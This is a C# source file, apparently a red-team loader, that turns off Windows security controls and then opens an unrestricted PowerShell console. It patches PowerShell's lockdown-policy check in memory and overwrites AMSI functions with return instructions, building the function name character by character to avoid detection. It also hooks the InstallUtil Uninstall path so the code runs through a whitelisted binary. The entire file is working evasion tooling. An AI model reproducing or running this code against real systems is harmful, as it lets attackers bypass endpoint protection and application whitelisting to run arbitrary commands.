using System;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using System.Runtime.ExceptionServices;
using System.IO;

namespace loader
{

    public class MainClass
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetStdHandle(int nStdHandle);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [HandleProcessCorruptedStateExceptions]public static void Main()
        {
            go();
        }

        [HandleProcessCorruptedStateExceptions]public static void go()
        {
            var Automation = typeof(System.Management.Automation.Alignment).Assembly;
            var get_lockdown_info = Automation.GetType("System.Management.Automation.Security.SystemPolicy").GetMethod("GetSystemLockdownPolicy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
            var get_lockdown_handle = get_lockdown_info.MethodHandle;
            uint lpflOldProtect;

            RuntimeHelpers.PrepareMethod(get_lockdown_handle);
            var get_lockdown_ptr = get_lockdown_handle.GetFunctionPointer();

            VirtualProtect(get_lockdown_ptr, new UIntPtr(4), 0x40, out lpflOldProtect);

            var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
            
            Marshal.Copy(new_instr, 0, get_lockdown_ptr, 4);
            string[] filePaths = Directory.GetFiles(@"c:\windows\system32", "a?s?.d*");
            string libname = (filePaths[0].Substring(filePaths[0].Length - 8));
            try
            {
                var lib = LoadLibrary(libname);
                Char c1, c2, c3, c4, c5, c6, c7, c8;
                c1 = 'A';
                c2 = 's';
                c3 = 'c';
                c4 = 'n';
                c5 = 'l';
                c6 = 't';
                c7 = 'z';
                c8 = 'U';
                var baseaddr = GetProcAddress(lib, c1 + "m" + c2 + "i" + c8 + "a" + c3 + "I" + c4 + "i" + c6 + "ia" + c5 + "i" + c7 + "e");
                var funcaddr = baseaddr - 96;
                VirtualProtect(funcaddr, new UIntPtr(8), 0x40, out lpflOldProtect);
                Marshal.Copy(new byte[] { 0x90, 0xC3 }, 0, funcaddr, 2);
                funcaddr = baseaddr - 352;
                VirtualProtect(funcaddr, new UIntPtr(8), 0x40, out lpflOldProtect);
                Marshal.Copy(new byte[] { 0x90, 0xC3 }, 0, funcaddr, 2);
            }
            catch
            {
                Console.WriteLine("Could not patch " + libname + "...");
            }
            

            string[] cmd = new string[] { "while ($true){$cmd = Read-Host -Prompt \"PS:\"; if ($cmd -Contains \"exit\") { break} else { iex $cmd; \"`n\"}}" };
            while (true)
            {
                Microsoft.PowerShell.ConsoleShell.Start(System.Management.Automation.Runspaces.RunspaceConfiguration.Create(), "Banner", "Help", cmd);
                break;
            }
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);
            MainClass.go();
        }
    }
}
